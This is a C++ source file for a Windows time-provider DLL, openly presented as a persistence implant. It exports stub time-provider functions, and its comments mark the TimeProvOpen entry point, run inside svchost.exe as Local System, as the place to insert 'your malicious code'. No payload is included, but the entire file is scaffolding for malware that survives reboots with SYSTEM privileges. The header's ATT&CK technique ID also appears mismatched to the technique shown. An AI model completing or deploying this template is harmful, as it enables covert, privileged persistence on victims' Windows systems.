/*
 * TimeProvider Persistence DLL (T1543.003)
 * Entry point: TimeProvOpen() - add payload code here
 */
#ifndef WINAPI
#define WINAPI __stdcall
#endif
#ifndef FALSE
#define FALSE 0
#endif
#ifndef TRUE
#define TRUE 1
#endif

typedef unsigned long ULONG;
typedef ULONG* PULONG;
typedef int BOOL;
typedef unsigned long DWORD;
typedef void* LPVOID;
typedef void* HMODULE;
typedef wchar_t WCHAR;
typedef WCHAR* PWSTR;
typedef unsigned __int64 ULONGLONG;

#define ERROR_SUCCESS 0

extern "C" {
    __declspec(dllexport) DWORD WINAPI TimeProvOpen(
        PWSTR pwszNamingSystem,
        PWSTR pwszDllName,
        void* ptpPI
    ) {
        // PAYLOAD ENTRY POINT - Runs in svchost.exe (Local System)
        // Replace this section with your malicious code
        return ERROR_SUCCESS;
    }

    __declspec(dllexport) DWORD WINAPI TimeProvClose() {
        return ERROR_SUCCESS;
    }

    __declspec(dllexport) DWORD WINAPI TimeProvGetSamples(
        void* ptpSamples,
        PULONG pnSamples
    ) {
        return ERROR_SUCCESS;
    }

    __declspec(dllexport) DWORD WINAPI TimeProvSetConfig(
        DWORD dwOperation,
        DWORD dwProviderIndex,
        ULONG ulRole,
        ULONG ulAllowable
    ) {
        return ERROR_SUCCESS;
    }
}

BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case 1:
        break;
    }
    return TRUE;
}